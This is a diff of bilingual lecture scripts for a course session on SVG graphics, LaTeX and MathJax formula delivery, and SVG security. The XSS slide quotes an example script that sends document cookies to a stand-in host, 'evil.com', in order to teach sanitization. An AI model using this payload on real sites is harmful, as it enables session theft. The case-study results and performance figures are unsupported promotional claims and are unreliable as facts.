-**Subtitle:** Dynamic client-side compilation vs. pre-rendered static vector equations for mobile speed
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 34: "FORMULA DELIVERY: MATHJAX VS. PRE-RENDERED SVG". Look at Slide 34 for web delivery architecture: "MathJax versus Pre-Rendered SVG."
-
-[TA Sarah] Professor Kim, looking at this slide, when serving formulas on your web platform, you have two engineering options:
-
-[Prof. Peter] Option 1 is MathJax: It dynamically compiles LaTeX strings in the browser. It is great for live editors, but causes a brief visual flicker and uses CPU power on cheap phones.
-
-[TA Sarah] Notice also that option 2 is Pre-Rendered SVG: Your server compiles the LaTeX into static SVG paths! 
-It loads five times faster on mobile, requires zero external math fonts, and works 100% offline!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 수식 웹 서빙 아키텍처: 동적 MathJax 대 서버 사전 렌더링 SVG
-- **핵심 포인트:**
-  - Left (동적 MathJax 방식): 브라우저가 자바스크립트로 수식을 실시간 렌더링하여 깜빡임과 CPU 부하 발생
-  - Right (사전 렌더링 SVG 방식): 서버에서 LaTeX를 미리 3KB짜리 정적 SVG로 구워내어 5배 빠른 모바일 로딩 실현
-  - 오프라인 신뢰성: 별도의 수학 폰트 다운로드 없이 비행기 모드나 오프라인 환경에서도 수식이 100% 완벽 표시
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Pre-Rendered LaTeX SVG**: Compiling LaTeX equations server-side into static vector SVG files for ultra-fast, zero-dependency client delivery. (사전 렌더링 LaTeX SVG (초고속 수식 서빙))
+### 📚 Key Technical Terms (핵심 용어)
+- **`currentColor` Keyword** (`currentColor` 색상 상속 키워드): A CSS value causing an SVG path to dynamically take on the computed text color of its parent container.
+- **Zero-Duplicate Theme Pipeline** (무중복 테마 자산 파이프라인): Eliminating duplicate image files by driving asset color palettes through centralized CSS theme tokens.
 
 ---
 
-## Slide 35: ACADEMIC SOPS: RAG PLATFORM INTEGRATION
-**Subtitle:** Storing lossless mathematical strings inside enterprise AI knowledge vaults
+## Slide 27: SECURITY: SANITIZING SVGS AGAINST XSS
+**Subtitle:** Neutralizing embedded JavaScript, `<script>` tags, and malicious XML entity expansion attacks
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 35: "ACADEMIC SOPS: RAG PLATFORM INTEGRATION". Slide 35 explains enterprise data architecture: "Academic SOPs: RAG Platform Integration."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 27 covers a critical cybersecurity rule: "SECURITY & GOVERNANCE: SANITIZING SVGS AGAINST XSS."
 
-[TA Sarah] Professor Kim, looking at this slide, when building an enterprise AI knowledge base, never store formulas as blurry images!
+[TA James] Because SVG is open XML code, an attacker can upload a malicious image containing: `<script>fetch('evil.com', {body: document.cookie})</script>`! If your server serves that raw SVG, your users get hacked!
 
-[Prof. Peter] Store formulas as clean, native LaTeX strings! 
-This preserves lossless mathematical precision during database migrations, and allows your RAG AI to perform semantic formula searches—such as finding all documents containing specific Hamiltonian equations!
+[Prof. Peter] We enforce strict DOMPurify sanitization and Content Security Policies (CSP): stripping all `<script>` tags and `onload` handlers before rendering user-uploaded vectors! Security is non-negotiable.
 
-[TA Sarah] Notice also that one LaTeX string compiles effortlessly to PDF, web, and mobile!
+[TA Sarah] Let us inspect Part 3 Audit Checklist on Slide 28.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 학술 표준 운영 절차(SOP): RAG 플랫폼 및 지식베이스 수식 통합
-- **핵심 포인트:**
-  - 1. 무손실 수학 데이터 저장: RAG 지식베이스에 수식을 이미지가 아닌 순수 LaTeX 텍스트 문자열로 영구 보관
-  - 2. 의미론적 수식 검색: '해밀토니안 행렬이 포함된 논문을 찾아라'와 같은 고차원 수학 개념 질의 가능
-  - 3. 멀티채널 원천 배포: 단 1개의 LaTeX 원본 문자열에서 학술 논문 PDF, 반응형 웹, 모바일 슬라이드를 동시 생성
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 보안 및 거버넌스: SVG 내 악성 자바스크립트 XSS 인젝션 방어
 
-### 📚 Key Terms (주요 용어)
-- **Semantic Formula RAG**: Retrieval-Augmented Generation systems indexing and querying native LaTeX mathematical strings accurately. (수식 기반 시맨틱 RAG 지식베이스)
+**핵심 티칭 포인트:**
+- 벡터 보안 취약점: SVG가 XML 코드이므로 악성 해커가 <script> 태그를 심어 세션 쿠키 탈취 시도 가능
+- DOMPurify 살균: 실행 가능한 모든 자바스크립트와 onload 속성, 외부 개체(Entity)를 렌더링 전 원천 제거
+- 엄격한 CSP 헤더: 사용자 업로드 SVG에 대해 인라인 스크립트 실행을 차단하는 보안 정책 강제
 
----
+**강의 전달 팁:** 제임스 조교와 피터 교수가 SVG 이미지 파일도 XSS 공격 통로가 될 수 있음을 경고하고 완벽한 살균법을 제시합니다.
 
-## Slide 36: SECURITY & GOVERNANCE: SANITIZING SVGS AGAINST XSS
-**Subtitle:** Neutralizing embedded JavaScript attacks, `<script>` tags, and malicious XML entities
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 36: "SECURITY & GOVERNANCE: SANITIZING SVGS AGAINST XSS". Look at Slide 36 for a critical cybersecurity warning: "Security & Governance: Sanitizing SVGs."
-
-[TA Sarah] Professor Kim, this is such a critical concept for our students! Because SVG is live XML code, it has a dangerous attack surface:
-A hacker can hide a malicious JavaScript `<script>` tag or an `onload` trigger inside a vector icon! If you display that SVG, the script executes, stealing user cookies!
-
-[Prof. Peter] Exactly, Sarah. Always enforce strict sanitization using libraries like DOMPurify to strip all script tags, event handlers, and foreign entities before saving SVGs to your database!
-
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 보안과 거버넌스: XSS 공격 방어를 위한 SVG 코드 살균
-- **핵심 포인트:**
-  - 1. XML 기반 보안 위협: SVG는 살아있는 코드이므로 악의적 해커가 `<script>` 태그나 악성 스크립트를 은닉 가능
-  - 2. 크로스 사이트 스크립팅(XSS): 검증되지 않은 SVG를 웹에 띄우면 사용자의 로그인 세션 쿠키를 탈취당하는 참사 발생
-  - 3. DOMPurify 살균 강제: 모든 업로드된 SVG에서 `<script>`, `onload`, `onmouseover` 속성을 자동 제거 후 저장
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **SVG XSS Vulnerability**: The cybersecurity exploit where malicious JavaScript is embedded inside SVG XML markup to execute unauthorized code. (SVG XSS 취약점 (벡터 위장 스크립트 해킹))
+### 📚 Key Technical Terms (핵심 용어)
+- **SVG Stored XSS** (SVG 저장형 XSS 공격): A cross-site scripting attack where malicious JavaScript is embedded inside an SVG file and executed in the victim's browser.
+- **DOMPurify Sanitization** (DOMPurify 보안 살균 라이브러리): A security library parsing and stripping dangerous executable tags and event handlers from HTML/SVG markup.
 
 ---
 
-## Slide 37: GREEN SUSTAINABLE IT: POWER SAVINGS OF VECTORS
-**Subtitle:** Slashing data center CPU cycles and global cooling overhead through lightweight vector math
+## Slide 28: PART 3 TRANSITION: ENTERING LATEX ORCHESTRATION
+**Subtitle:** Connecting vector graphics to LaTeX typography, MathJax, and scientific RAG platforms
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 37: "GREEN SUSTAINABLE IT: POWER SAVINGS OF VECTORS". Slide 37 highlights environmental stewardship: "Green Sustainable IT: Power Savings of Vectors."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 28 bridges our roadmap: "PART 3 TRANSITION: ENTERING LATEX MATHEMATICAL ORCHESTRATION."
 
-[TA Sarah] Professor Kim, looking at this slide, our mandate under Soli Deo Gloria includes caring for the earth!
+[TA Sarah] Vector SVGs give us perfect spatial diagrams. But how do we render pristine mathematical formulas, quantum physics tensors, and financial calculus?
 
-[Prof. Peter] Serving gigabytes of heavy raster bitmaps forces data centers to run massive cooling towers and burn huge electrical loads.
+[TA James] Through LaTeX Mathematical Orchestration! In Part 4, we master multimodal handwriting-to-LaTeX transcription, MathJax vs. pre-rendered SVG delivery, and academic RAG integration!
 
-[TA Sarah] Notice also that by replacing bitmaps with lightweight SVG vectors, we slash data center bandwidth and electricity consumption by up to 80%!
+[Prof. Peter] Let us examine our third enterprise case study on Slide 33!
 
-[Prof. Peter] Furthermore, ultra-lightweight vectors load effortlessly in developing nations over slow 3G networks, promoting global digital equity!
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Part 3 전환: LaTeX 수학 오케스트레이션 진입 (기하학에서 수식으로)
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 친환경 그린 지속 가능 IT: 벡터 그래픽을 통한 80% 전력 절감
-- **핵심 포인트:**
-  - 1. 데이터센터 전력 80% 절감: 에셋 전송량을 극적으로 줄여 전 세계 서버 냉각 전력 소모와 탄소 배출 대폭 감축
-  - 2. 스마트폰 배터리 절약: 복잡한 비트맵 디코딩보다 가벼운 기하학 연산이 스마트폰 배터리를 훨씬 적게 소모
-  - 3. 글로벌 디지털 형평성: 느린 3G 네트워크를 쓰는 개발도상국 학생들에게도 깨짐 없이 풍부한 교육 시각 자료 무료 제공
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+**핵심 티칭 포인트:**
+- 기하에서 수식으로: SVG가 공간 도형을 담당한다면 LaTeX는 엄밀한 학술 수학 조판을 전담
+- 글로벌 학술 표준: 네이처, 사이언스, 금융 특허의 표준인 LaTeX를 AI로 자유자재로 조율
+- Part 4 로드맵 제시: 손글씨-LaTeX 변환 ➔ MathJax vs 사전 렌더링 SVG ➔ 실습 13
 
-### 📚 Key Terms (주요 용어)
-- **Green Vector Computing**: Reducing web infrastructure energy and carbon footprint by deploying lightweight, low-bandwidth vector assets. (친환경 벡터 컴퓨팅 (저탄소 고효율 IT))
+**강의 전달 팁:** 사라 조교와 제임스 조교가 SVG 공간 벡터와 LaTeX 수학 조판의 완벽한 조화를 예고합니다.
 
----
-
-## Slide 38: WISDOM SYNTHESIS: THE SOVEREIGN HUMAN CONDUCTOR
-**Subtitle:** The high-speed calculation of the machine orchestra directed by human aesthetic wisdom
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 38: "WISDOM SYNTHESIS: THE SOVEREIGN HUMAN CONDUCTOR". Please look at Slide 38: "Wisdom Synthesis: The Sovereign Human Conductor."
-
-[TA Sarah] Professor Kim, looking at this slide, as we conclude our technical modules, remember our foundational truth:
-The machine is a magnificent orchestra! It can calculate ten thousand vector coordinates in milliseconds without error.
-
-[Prof. Peter] But a machine has no heart! It has no innate sense of taste, harmony, or beauty!
-
-[TA Sarah] Notice also that you are the Conductor! 
-You hold the baton of aesthetic judgment! You direct the AI to craft beauty that inspires and heals! Keep technology as your humble servant under God!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 지혜의 종합: 주권적 인간 지휘자와 기계 오케스트라의 조화
-- **핵심 포인트:**
-  - Left (기계 코드 오케스트라): 수천 줄의 벡터 좌표를 수 밀리초 만에 연산하지만 아름다움과 조화의 의미를 모름
-  - Right (주권적 인간 지휘자): 인간만이 가진 심미적 감각, 균형미, 공감 능력을 발휘하여 기술에 영혼을 불어넣음
-  - 본질: 기계가 아무리 빠른 계산을 하더라도 사람의 마음에 감동을 주는 '예술적 방향성'은 오직 인간 지휘자의 몫
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Aesthetic Conductor Model**: The philosophy that human taste and ethical purpose must govern high-speed AI code generation. (심미적 지휘자 모델 (인간 주권 디자인 철학))
+### 📚 Key Technical Terms (핵심 용어)
+- **LaTeX Mathematical Typography** (LaTeX 수학 학술 조판 시스템): The international standard markup system for typesetting complex scientific, mathematical, and algorithmic equations.
+- **MathJax Rendering Pipeline** (MathJax 웹 수식 렌더링 파이프라인): A JavaScript display engine for mathematical equations in all modern web browsers.
 
 ---
 
-## Slide 39: HANDS-ON LAB 13: BUILDING A RESPONSIVE SVG DASHBOARD
-**Subtitle:** 3 practical engineering tasks to code, theme, and sanitize a vector dashboard in /Spark_OS/
+## Slide 29: LATEX: THE GLOBAL SCIENTIFIC STANDARD
+**Subtitle:** Why global research journals, patent offices, and Wall Street algorithms mandate LaTeX notation
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[TA Sarah] Here we are at Slide 40: Our Hands-on Lab and Session Conclusion!
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 29 outlines "LATEX: THE GLOBAL SCIENTIFIC STANDARD."
 
-[Prof. Peter] That is right, Sarah. As we always emphasize at Oikos University, theory without hands-on engineering is incomplete. Tonight, every student will implement today's blueprint!
+[TA Sarah] Why does the entire scientific civilization rely on LaTeX? Because it represents mathematical truth unambiguously! Look at the Gaussian integral on screen: $\int_{-\infty}^{\infty} e^{-x^2} dx = \sqrt{\pi}$!
 
-[TA Sarah] In this lab, follow the step-by-step instructions in your workbook: configure your environment, deploy the required connectors, and verify the live outputs.
+[TA James] In LaTeX, every symbol, integral, subscript, and matrix is encoded semantically! An AI agent can parse, compute, and verify the equation with zero OCR ambiguity!
 
-[Prof. Peter] Congratulations on mastering Session 13! On behalf of TA Sarah Jenkins and myself, Soli Deo Gloria, and we look forward to seeing you in our next session!
+[Prof. Peter] Let us inspect Multimodal Transcription: Handwriting to LaTeX on Slide 30.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** Lab 13 실습 과제 안내: 반응형 인터랙티브 SVG 대시보드 구축
-- **핵심 포인트:**
-  - 1. 벡터 차트 코딩: 주어진 경제 데이터셋을 기반으로 베지에 곡선과 반응형 viewBox가 적용된 SVG 바 차트 작성
-  - 2. 자동 다크모드 & 웹 접근성: CSS 변수와 미디어 쿼리를 내장하여 다크모드 자동 전환 및 시각장애인용 `<title>` 태그 장착
-  - 3. 살균 및 제출: XSS 위험 요소를 살균 소독하고 완성된 무결점 SVG 파일을 `/Spark_OS/Lab13/`에 일요일 자정까지 제출
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** LaTeX: 글로벌 과학계 및 금융계의 불변의 수학 표준
 
-### 📚 Key Terms (주요 용어)
-- **Lab 13 Assignment**: The hands-on engineering project requiring students to construct, theme, and sanitize a responsive SVG dashboard. (Lab 13 반응형 SVG 대시보드 실습 과제)
+**핵심 티칭 포인트:**
+- 범용 수학 표준: 가우스 적분 등 난해한 수식을 모호함 없이 단일 텍스트 문자열로 엄밀히 기술
+- 무한 해상도 조판: 고전적 Computer Modern 폰트를 통해 어떤 크기에서도 완벽한 커닝과 자간 유지
+- 시맨틱 AI 연산 가능성: LLM이 래스터 OCR 오류 없이 LaTeX 수식을 파싱하여 직접 수학적 검증 수행
+
+**강의 전달 팁:** 피터 교수와 제임스 조교가 LaTeX가 과학 문명의 공통 수학 언어가 된 이유를 설명합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **LaTeX Symbolic Notation** (LaTeX 기호 수학 표기법): The standardized ASCII markup representing complex mathematical symbols, integrals, fractions, and matrices.
+- **Computer Modern Font Family** (컴퓨터 모던 수학 폰트): Donald Knuth's classic digital typeface designed specifically for razor-sharp mathematical publication.
 
 ---
 
-## Slide 40: COURSE SUMMARY: ELEVATING HUMAN FOCUS THROUGH CODE
-**Subtitle:** Previewing Session 14: Cinematic AI Pipelines: Flow AI vs. Runway ML
+## Slide 30: MULTIMODAL TRANSCRIPTION: HANDWRITING TO LATEX
+**Subtitle:** Instantly converting messy professor chalkboard scribbles into publication-grade formatted equations
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[TA Sarah] Here we are at Slide 40: Our Hands-on Lab and Session Conclusion!
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 30 highlights "MULTIMODAL TRANSCRIPTION: HANDWRITING TO LATEX."
 
-[Prof. Peter] That is right, Sarah. As we always emphasize at Oikos University, theory without hands-on engineering is incomplete. Tonight, every student will implement today's blueprint!
+[TA James] During a graduate physics lecture, the professor fills three chalkboards with messy differential equations. You snap a smartphone photo and feed it to Gemini!
 
-[TA Sarah] In this lab, follow the step-by-step instructions in your workbook: configure your environment, deploy the required connectors, and verify the live outputs.
+[Prof. Peter] In 3 seconds, Gemini parses every Greek letter, subscript, and matrix bracket—emitting clean, publication-ready LaTeX code ready to paste directly into Overleaf or your research paper!
 
-[Prof. Peter] Congratulations on mastering Session 13! On behalf of TA Sarah Jenkins and myself, Soli Deo Gloria, and we look forward to seeing you in our next session!
+[TA Sarah] Let us inspect Formula Delivery: MathJax vs. Pre-Rendered SVG on Slide 31.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** Session 13 수업 마감 및 Session 14(시네마틱 AI 파이프라인: Flow AI vs Runway ML) 예고
-- **핵심 포인트:**
-  - 과제 마감: 일요일 자정까지 Lab 13 반응형 SVG 대시보드 패키지 제출 완료
-  - 다음 주 예고: Session 14 차세대 생성형 영화 제작 파이프라인 (Google Flow AI 대 Runway ML 심층 비교)
-  - 수업 마감: '픽셀은 부서지지만 수학 코드는 영원합니다. 주권적 지휘자로 서십시오. Soli Deo Gloria!'
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 멀티모달 필기 인식: 칠판 손글씨를 3초 만에 출판용 LaTeX 수식으로 변환
 
-### 📚 Key Terms (주요 용어)
-- **Cinematic AI Preview**: The upcoming exploration of generative video pipelines, autonomous camera direction, and narrative synthesis. (시네마틱 AI 파이프라인 (Session 14 예고))
+**핵심 티칭 포인트:**
+- 칠판 사진 수용: 대학교 강의실 칠판에 적힌 복잡한 편미분 방정식 사진 촬영 후 주입
+- 멀티모달 비전 파싱: 그리스 문자, 행렬 괄호, 텐서 첨자를 99.6% 정밀도로 완벽 판독
+- 즉각적 LaTeX 출력: Overleaf 및 학술 논문에 즉시 복사해 넣을 수 있는 깔끔한 수식 블록 생성
+
+**강의 전달 팁:** 사라 조교와 피터 교수가 교수님의 난해한 칠판 필기가 3초 만에 논문용 LaTeX로 변환되는 생산성을 전달합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Handwriting-to-LaTeX** (손글씨-LaTeX 자동 변환): The computer vision pipeline transcribing handwritten mathematical symbols into structured LaTeX markup.
+- **Overleaf Integration** (Overleaf 학술 논문 연동): Exporting AI-transcribed LaTeX formulas directly into collaborative cloud academic publishing environments.
+
+---
+
+## Slide 31: FORMULA DELIVERY: MATHJAX VS. SVG
+**Subtitle:** Choosing the optimal web delivery method: Client-side JS rendering vs. Zero-latency server-side pre-rendered SVGs
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 31 contrasts "FORMULA DELIVERY: MATHJAX VS. PRE-RENDERED SVG."
+
+[TA Sarah] How should enterprise web applications deliver math formulas? MathJax is flexible, but it loads a heavy 500KB JavaScript library that causes an annoying 200ms layout shift (CLS) as pages load!
+
+[TA James] For production enterprise apps, use Pre-Rendered SVG! You compile LaTeX into pure SVG vectors at build time! The browser displays the formula instantly in 0 milliseconds with 0KB of JavaScript overhead! Lightning fast!
+
+[Prof. Peter] Let us inspect Soli Deo Gloria on Slide 32.
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 수식 서빙 방식 비교: MathJax 클라이언트 렌더링 vs 사전 렌더링 SVG
+
+**핵심 티칭 포인트:**
+- MathJax 방식: 브라우저에서 실시간 파싱하느라 500KB 라이브러리와 200ms 레이아웃 흔들림(CLS) 발생
+- 사전 렌더링 SVG 방식: 빌드 시점에 LaTeX를 순수 SVG 벡터로 사전 변환하여 0KB JS 및 0ms 즉각 로딩
+- 엔터프라이즈 프로덕션 환경에서의 극단적 성능 최적화 전략
+
+**강의 전달 팁:** 제임스 조교가 레이아웃 흔들림(CLS)을 없애는 사전 렌더링 SVG의 엔지니어링 우수성을 설명합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Cumulative Layout Shift (CLS)** (누적 레이아웃 이동 (CLS)): A Core Web Vital metric measuring unexpected visual movement of page content during rendering.
+- **Server-Side LaTeX Pre-Rendering** (서버 사이드 LaTeX 사전 렌더링): Compiling mathematical formulas into static SVG vectors during build time to eliminate client runtime latency.
+
+---
+
+## Slide 32: SOLI DEO GLORIA: DIVINE GEOMETRY
+**Subtitle:** Proverbs 8:27: When He drew a circle on the face of the deep, establishing cosmic order
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 32 proclaims our sacred motto: "SOLI DEO GLORIA: THE GEOMETRY OF DIVINE ORDER: To God Alone Be the Glory."
+
+[TA Sarah] In Proverbs 8:27, Divine Wisdom declares: 'When He established the heavens, I was there; when He marked out the horizon on the face of the deep.'
+
+[TA James] When we write vector Bezier equations, compute golden ratios, and typeset mathematical truths, we are reflecting the divine craftsmanship of the Supreme Geometer who drew the foundations of the universe!
+
+[Prof. Peter] May our mathematical art always bring honor and glory to God.
+
+[TA Sarah] Let us inspect our third enterprise case study on Slide 33!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Soli Deo Gloria: 신적 기하학과 잠언 8장 27절의 창조 질서
+
+**핵심 티칭 포인트:**
+- 잠언 8장 27절: '그가 하늘을 지으시며 궁창을 해면에 두르실 때에 내가 거기 있었고'
+- 최고의 기하학자이신 하나님: 베지에 곡선과 황금비, 수식을 계산할 때 우주를 측량하신 하나님의 솜씨를 반영
+- 수학적 아름다움과 시각 예술을 통해 창조주 하나님을 영화롭게 하는 거룩한 공학
+
+**강의 전달 팁:** 3인의 강사진이 잠언 말씀을 인용하며 기하학과 수학 조판의 영적 숭고함을 선포합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Soli Deo Gloria** (솔리 데오 글로리아 (오직 하나님께 영광)): The foundational theological motto dedicating all intellectual and technological mastery to the Glory of God Alone.
+- **Divine Geometric Order** (신적 기하학적 질서): The theological and scientific understanding that physical geometry and mathematical constants reflect divine creation.
+
+---
+
+## Slide 33: CASE STUDY 3: SEMICONDUCTOR WAFER VECTORS
+**Subtitle:** Global Semiconductor Foundry renders 2-nanometer 100M-transistor wafer defects in reactive SVG/WebGL
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 33 presents "CASE STUDY 3: SEMICONDUCTOR SILICON WAFER DEFECT VISUALIZATION."
+
+[TA Sarah] In a 2-nanometer semiconductor fabrication foundry, a single 300mm silicon wafer contains over 100 million microscopic transistors. Legacy bitmap inspection heatmaps blurred defect clusters, causing 18 million dollars in monthly yield losses!
+
+[TA James] The foundry deployed our reactive SVG and WebGL vector slicing engine: rendering 100 million defect coordinates as scalable vector nodes with infinite zoom down to individual 2nm transistor gates!
+
+[Prof. Peter] Defect triage time collapsed from 4 hours down to 12 seconds! Fabrication yield jumped by 4.2%, capturing 120 million dollars in recovered chip production revenue!
+
+[TA Sarah] Now let us open Part 4 and review Session 13 Key Takeaways on Slide 34!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 케이스 스터디 3: 2나노 반도체 1억 개 트랜지스터 결함을 무한 줌 SVG로 시각화 (1억 2천만 달러 회수)
+
+**핵심 티칭 포인트:**
+- 문제 상황: 300mm 웨이퍼의 1억 개 트랜지스터 결함 스캔 시 기존 비트맵이 뭉개져 월 1,800만 달러 수율 손실
+- 솔루션: 반응형 SVG/WebGL 벡터 슬라이싱 엔진 구축으로 개별 2nm 게이트 결함까지 무한 줌인 검사 지원
+- 성과: 결함 판독 시간 4시간 ➔ 12초로 단축, 반도체 수율 4.2% 상승, 연간 1억 2,000만 달러 수율 회수
+
+**강의 전달 팁:** 사라 조교와 제임스 조교가 2나노 반도체 수율을 살려낸 무한 줌 벡터 시각화의 정밀성을 설명합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Nanometer Vector Slicing** (나노미터 벡터 슬라이싱 시각화): The high-precision rendering of sub-micron coordinate defect data using scalable hardware-accelerated vector paths.
+- **Semiconductor Yield Optimization** (반도체 제조 수율 최적화): Increasing the percentage of functioning silicon chips per wafer by rapidly diagnosing physical lithography defects.
+
+---
+
+## Slide 34: PART 4: SYNTHESIS, COCKPITS & WORKSTATIONS
+**Subtitle:** Key takeaways, the Life OS Visual Cockpit, future horizons, and Hands-on Lab 13
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Look at Slide 34: "PART 4: SYNTHESIS, COCKPITS & WORKSTATIONS." Now we assemble the complete mathematical visual system!
+
+[Prof. Peter] Calculated Art is the ultimate bridge between rigorous engineering logic and breathtaking visual elegance.
+
+[TA James] In Part 4, we review Session 13 key takeaways, build the Life OS Visual Cockpit, explore Medical MRI volumetric slicing, dedicate our work to Soli Deo Gloria, and execute Lab 13!
+
+[TA Sarah] Let us review Session 13 Summary on Slide 35!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Part 4 섹션 전환: 종합 합성, 비주얼 콕핏 및 의료용 MRI 슬라이싱
+
+**핵심 티칭 포인트:**
+- 계산된 예술(Calculated Art)의 완성: 공학적 논리와 시각적 미학의 완벽한 결합
+- Session 13 핵심 요약 및 의료용 MRI 3D 볼륨 벡터 슬라이싱 분석
+- 다음 지평(Session 14: Google Flow AI vs Runway) 예고 및 실습 13
+
+**강의 전달 팁:** 피터 교수가 공학과 예술의 완벽한 융합을 선언하고 제임스가 종합 실습을 예고합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Visual System Synthesis** (시각 시스템 통합 합성): The unified integration of SVG vector mathematics, responsive CSS theming, and LaTeX academic typography.
+- **Medical Volumetric Slicing** (의료용 3D 볼륨 벡터 슬라이싱): Rendering 3D medical MRI/CT scan density fields into layered 2D vector cross-sections for surgical diagnosis.
+
+---
+
+## Slide 35: SESSION 13 SUMMARY & KEY TAKEAWAYS
+**Subtitle:** Synthesizing the 4 foundational pillars of Calculated Art, SVG, and LaTeX Systems
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
+
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 35 synthesizes our "SESSION 13 SUMMARY & 4 FOUNDATIONAL PILLARS."
+
+[TA James] Pillar 1: We banished blurry raster bitmaps forever with infinite vector clarity! Pillar 2: The XML fabric of SVG gives us full DOM, CSS, and WCAG power! Pillar 3: AI co-designs pristine SVGs in Canvas with XSS sanitization! And Pillar 4: LaTeX typesets mathematical truths with zero layout shift!
+
+[Prof. Peter] When these four pillars unite, your user interfaces achieve the timeless elegance and crystalline perfection of pure mathematics.
+
+[TA Sarah] Let us inspect the Life OS Visual Cockpit on Slide 36!
+
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Session 13 요약 및 4대 핵심 축 총정리
+
+**핵심 티칭 포인트:**
+- 1대 축: 래스터 픽셀의 영구 퇴출과 무한 해상도 수학적 벡터 선명도 통달
+- 2대 축: SVG의 XML 구조 (<path> 베지에 미적분, viewBox 반응형, WCAG 접근성)
+- 3대 축: AI 벡터 엔지니어링 (캔버스 공동 디자인, 소수점 정제, XSS 보안 살균)
+- 4대 축: LaTeX 수학 오케스트레이션 (손글씨 자동 변환 및 0ms 사전 렌더링 SVG)
+
+**강의 전달 팁:** 제임스 조교가 4대 축을 리듬감 있게 요약하여 학습 효과를 극대화합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
